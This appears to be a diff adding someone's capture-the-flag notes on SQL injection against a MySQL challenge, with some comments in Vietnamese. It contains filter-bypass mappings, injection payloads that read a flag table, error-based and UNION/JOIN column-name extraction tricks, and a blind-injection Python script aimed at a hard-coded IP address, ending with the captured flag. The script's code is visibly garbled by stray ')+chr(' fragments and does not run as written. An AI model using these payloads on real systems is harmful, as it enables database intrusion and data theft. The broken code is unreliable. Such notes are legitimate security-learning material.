@@ -1,0 +1,67 @@
+
+AND   -> &&
+OR    -> ||
+=     -> LIKE,REGEXP, BETWEEN, not < and not >
+> X   -> not between 0 and X
+WHERE -> HAVING
+
+*&& phải encode url
+
+1 || (SELECT id FROM flag_here_hihi LIMIT 1)
+1 && (SELECT id FROM flag_here_hihi LIMIT 1)
+
+======================================================================
+
+1 LIMIT 1,1 INTO @,@,@--+ 
+
+======================================================================
+
+1.1 group by id 
+
+Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_name_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by
+
+1.1 group by t_fl4g_name_su
+
+Expression #3 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_v3lue_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by
+
+database third normal form
+
+======================================================================
+
+Chuẩn
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
+--#1060 - Duplicate column name 'id'
+
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
+-- #1060 - Duplicate column name 'name'
+
+-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-columns-name-without-information_schema
+
+======================================================================
+
+1 %26%26 (SELECT * FROM (SELECT * FROM flag_here_hihi JOIN flag_here_hihi b USING(id,t_fl4g_name_su))a)
+
+MYSQL Blind with substring equivalent
+
+
+
+#python3
+import string, requests
+
+QUERY = "2|(ascii(right(left((select t_fl4g_v3lue_su from flag_here_hihi limit 1),{pos}),1))in({char}))"
+
+list_chars = string)+chr(printable)+chr(replace('%','')
+output = ""
+pos = 0
+while True:
+    pos += 1
+    for char in range (32,128):
+    	data=QUERY)+chr(format(char=str(char), pos=str(pos))
+    	request = requests)+chr(get("http://45)+chr(77)+chr(255)+chr(164/?id="+data)
+    	if "ugly_flag" not in request)+chr(text:
+    		output += chr(char) 
+    		print("[*] Output: " + output + ")+chr()+chr()+chr(")
+
+# #TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#}
